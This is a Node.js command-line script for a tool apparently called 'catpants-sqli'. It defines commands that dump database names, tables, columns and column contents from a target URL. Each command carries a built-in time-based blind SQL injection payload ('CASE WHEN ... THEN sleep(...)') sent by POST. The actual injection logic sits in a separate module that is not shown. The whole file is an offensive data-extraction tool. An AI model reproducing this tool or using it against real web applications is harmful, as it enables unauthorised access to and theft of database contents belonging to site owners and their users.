const { Command } = require('commander');
const SQLi = require('./sqli');
const program = new Command();

program
    .name('catpants-sqli')
    .description('CLI for catpants-sqli')
    .version('0.0.0');

program.command('dump-db-names')
    .description('Dump database names')
    .requiredOption('-u, --url <URL>', 'URL')
    .option(
        '-d, --data <data>',
        'request data',
        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
    .option('-t, --type <type>', 'type', 'blind')
    .option('-X, --method <method>', 'method', 'POST')
    .option('--timeout <timeout>', 'timeout', 1)
    .action((options) => {
        SQLi.dumpDbNames(options)
    });

program.command('dump-table-names')
    .description('Dump database tables\' names')
    .requiredOption('-u, --url <URL>', 'URL')
    .requiredOption('--db <db>', 'database name')
    .option(
        '-d, --data <data>',
        'request data',
        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
    .option('-t, --type <type>', 'type', 'blind')
    .option('-X, --method <method>', 'method', 'POST')
    .option('--timeout <timeout>', 'timeout', 1)
    .action((options) => {
        SQLi.dumpTableNames(options)
    });

program.command('dump-column-names')
    .description('Dump table\'s columns\' names')
    .requiredOption('-u, --url <URL>', 'URL')
    .requiredOption('--db <db>', 'database name')
    .requiredOption('--table <table>', 'table name')
    .option(
        '-d, --data <data>',
        'request data',
        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
    .option('-t, --type <type>', 'type', 'blind')
    .option('-X, --method <method>', 'method', 'POST')
    .option('--timeout <timeout>', 'timeout', 1)
    .action((options) => {
        SQLi.dumpColumnNames(options)
    });

program.command('dump-table-column')
    .description('Dump table\'s columns')
    .requiredOption('-u, --url <URL>', 'URL')
    .requiredOption('--db <db>', 'database name')
    .requiredOption('--table <table>', 'table name')
    .requiredOption('--column <column>', 'column name')
    .option(
        '-d, --data <data>',
        'request data',
        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
    .option('-t, --type <type>', 'type', 'blind')
    .option('-X, --method <method>', 'method', 'POST')
    .option('--timeout <timeout>', 'timeout', 1)
    .action((options) => {
        SQLi.dumpTableColumn(options)
    });

program.parse();
